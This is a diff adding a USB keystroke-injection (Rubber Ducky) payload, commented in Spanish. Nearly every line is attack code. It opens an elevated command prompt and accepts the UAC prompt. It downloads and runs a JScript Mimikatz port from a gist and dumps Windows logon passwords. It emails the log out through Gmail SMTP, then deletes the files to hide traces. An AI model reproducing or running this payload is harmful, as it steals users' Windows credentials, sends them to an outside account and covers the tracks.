@@ -1,0 +1,80 @@
+REM Este sencillo payload se encargará de ejecutar el script de subTee - katz.js
+REM para extraer las contraseñas de Windows y enviarlas por Gmail
+DELAY 3000
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 3000
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://gist.githubusercontent.com/subTee/b30e0bcc7645c790fcd993cfd0ad622f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js','%TEMP%\katz.js')
+ENTER
+DELAY 4000
+STRING cls
+ENTER
+DELAY 100
+STRING cd %TEMP%
+ENTER
+DELAY 1000
+STRING cscript.exe .\katz.js
+ENTER
+REM Ahora hay que tener cuidado a la hora de poner el proximo delay debido a que
+REM el JScript tardará más o menos dependiendo de lo que tarde en procesarlo el ordenador
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+DELAY 10000
+STRING log katz.log
+ENTER
+DELAY 300
+STRING privilege::debug
+ENTER
+DELAY 300
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 2000
+STRING exit
+ENTER
+DELAY 300
+STRING del katz.js
+ENTER
+DELAY 300
+REM A partir de aquí habrá que rellenar algunas partes con nuestros datos de Gmail
+REM esta parte del payload fue creada previamente por hak5darren
+STRING powershell
+ENTER
+DELAY 300
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('usuariodegmail', 'contraseñadegmail');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'cuentaemisoradelemail'
+ENTER
+STRING $ReportEmail.To.Add('cuentadeemailquerecibiraelmensaje')
+ENTER
+STRING $ReportEmail.Subject = 'Katz.js report'
+ENTER
+STRING $ReportEmail.Body = 'Log de Katz.js adjunto al email' 
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\%TEMP%\katz.log')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM Borramos el log y finalizamos el payload
+STRING del c:\%TEMP%\katz.log
+ENTER
+DELAY 300
+STRING exit
+ENTER
